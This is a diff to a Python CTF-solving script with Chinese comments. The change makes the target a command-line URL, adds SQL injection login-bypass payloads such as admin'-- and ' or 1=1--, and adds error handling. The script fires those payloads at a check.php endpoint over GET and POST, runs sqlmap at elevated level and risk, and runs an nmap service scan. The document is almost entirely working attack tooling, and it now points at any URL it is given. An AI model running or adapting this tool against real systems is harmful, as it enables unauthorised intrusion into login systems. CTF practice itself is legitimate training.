@@ -1,20 +1,39 @@
 #!/usr/bin/env python3
+"""
+CTF挑战解决方案
+用法: python solve_ctf_comprehensive.py <目标URL>
+示例: python solve_ctf_comprehensive.py http://4c990763-30f2-422c-b68f-109fe46d4399.node5.buuoj.cn:81
+"""
 
 import asyncio
 import aiohttp
-import re 
+import re
 import subprocess
 import json
 import os
+import sys
 from datetime import datetime
+from urllib.parse import urlparse
 
 
 class CTFSolver:
     """CTF挑战求解器"""
     
-    def __init__(self):
-        self.target_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81/check.php"
-        self.base_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81"
+    def __init__(self, target_url):
+        # 确保URL以/check.php结尾
+        if not target_url.endswith('/check.php'):
+            # 如果URL以/结尾，添加check.php
+            if target_url.endswith('/'):
+                target_url = target_url + 'check.php'
+            else:
+                target_url = target_url + '/check.php'
+        
+        self.target_url = target_url
+        
+        # 提取基础URL
+        parsed = urlparse(target_url)
+        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
+        
         self.session = None
         self.flag = None
     
@@ -50,38 +69,46 @@ class CTFSolver:
             {"username": "admin'--", "password": ""},
             {"username": "admin'#", "password": ""},
             {"username": "admin' or 1=1#", "password": ""},
+            {"username": "' or 1=1--", "password": ""},
+            {"username": "' or '1'='1", "password": ""},
         ]
         
         for payload in payloads:
             # GET请求
-            async with self.session.get(self.target_url, params=payload) as response:
-                text = await response.text()
-                flag = self.detect_flag(text)
-                
-                if flag:
-                    self.flag = flag
-                    return {
-                        "method": "GET",
-                        "payload": payload,
-                        "flag": flag,
-                        "status": response.status,
-                        "response_text": text[:200] if len(text) > 200 else text
-                    }
+            try:
+                async with self.session.get(self.target_url, params=payload, timeout=10) as response:
+                    text = await response.text()
+                    flag = self.detect_flag(text)
+                    
+                    if flag:
+                        self.flag = flag
+                        return {
+                            "method": "GET",
+                            "payload": payload,
+                            "flag": flag,
+                            "status": response.status,
+                            "response_text": text[:200] if len(text) > 200 else text
+                        }
+            except Exception as e:
+                print(f"    GET请求失败: {e}")
             
             # POST请求
-            async with self.session.post(self.target_url, data=payload) as response:
-                text = await response.text()
-                flag = self.detect_flag(text)
-                
-                if flag:
-                    self.flag = flag
-                    return {
-                        "method": "POST",
-                        "payload": payload,
-                        "flag": flag,
-                        "status": response.status,
-                        "response_text": text[:200] if len(text) > 200 else text
-                    }
+            try:
+                async with self.session.post(self.target_url, data=payload, timeout=10) as response:
+                    text = await response.text()
+                    flag = self.detect_flag(text)
+                    
+                    if flag:
+                        self.flag = flag
+                        return {
+                            "method": "POST",
+                            "payload": payload,
+                            "flag": flag,
+                            "status": response.status,
+                            "response_text": text[:200] if len(text) > 200 else text
+                        }
+            except Exception as e:
+                print(f"    POST请求失败: {e}")
         
         # 如果没有找到flag，返回None
         return None
@@ -96,6 +123,7 @@ class CTFSolver:
         cmd = f"sqlmap -u \"{self.target_url}?username=test&password=test\" --batch --level=2 --risk=2"
         
         try:
+            print(f"   运行命令: {cmd[:80]}...")
             process = subprocess.run(
                 cmd,
                 shell=True,
@@ -125,23 +153,32 @@ class CTFSolver:
             }
             
         except subprocess.TimeoutExpired:
+            print("   sqlmap扫描超时")
             return {"timeout": True}
         except Exception as e:
+            print(f"   sqlmap错误: {e}")
             return {"error": str(e)}
     
     def run_nmap(self):
         """运行nmap扫描"""
         # 提取主机
-        host = self.base_url.replace("http://", "").split("/")[0]
+        parsed = urlparse(self.base_url)
+        host = parsed.netloc.split(':')[0]  # 移除端口
         
         # 创建输出目录
         output_dir = "nmap_results"
         os.makedirs(output_dir, exist_ok=True)
         
+        # 获取端口
+        port = parsed.port
+        if not port:
+            port = 80 if parsed.scheme == 'http' else 443
+        
         # nmap命令
-        cmd = f"nmap -sV -p 81 {host}"
+        cmd = f"nmap -sV -p {port} {host}"
         
         try:
+            print(f"   运行命令: {cmd}")
             process = subprocess.run(
                 cmd,
                 shell=True,
@@ -165,8 +202,10 @@ class CTFSolver:
             }
             
         except subprocess.TimeoutExpired:
+            print("   nmap扫描超时")
             return {"timeout": True}
         except Exception as e:
+            print(f"   nmap错误: {e}")
             return {"error": str(e)}
     
     async def solve(self):
@@ -242,10 +281,11 @@ class CTFSolver:
             if result:
                 final_result["exploit"] = f"{result.get('payload', {}).get('username', '')} ({result.get('method', '')})"
             
-            with open("ctf_solution.json", "w", encoding="utf-8") as f:
+            output_file = "ctf_solution.json"
+            with open(output_file, "w", encoding="utf-8") as f:
                 json.dump(final_result, f, indent=2, ensure_ascii=False)
             
-            print(f"\n结果已保存到: ctf_solution.json")
+            print(f"\n结果已保存到: {output_file}")
             
             return final_result
             
@@ -255,7 +295,21 @@ class CTFSolver:
 
 async def main():
     """主函数"""
-    solver = CTFSolver()
+    # 检查命令行参数
+    if len(sys.argv) < 2:
+        print("错误: 请提供目标URL")
+        print(f"用法: {sys.argv[0]} <目标URL>")
+        print(f"示例: {sys.argv[0]} http://example.com:81")
+        return 1
+    
+    target_url = sys.argv[1]
+    
+    # 验证URL格式
+    if not target_url.startswith(('http://', 'https://')):
+        print(f"警告: URL应以http://或https://开头，自动添加http://")
+        target_url = 'http://' + target_url
+    
+    solver = CTFSolver(target_url)
     result = await solver.solve()
     
     if result.get("flag"):
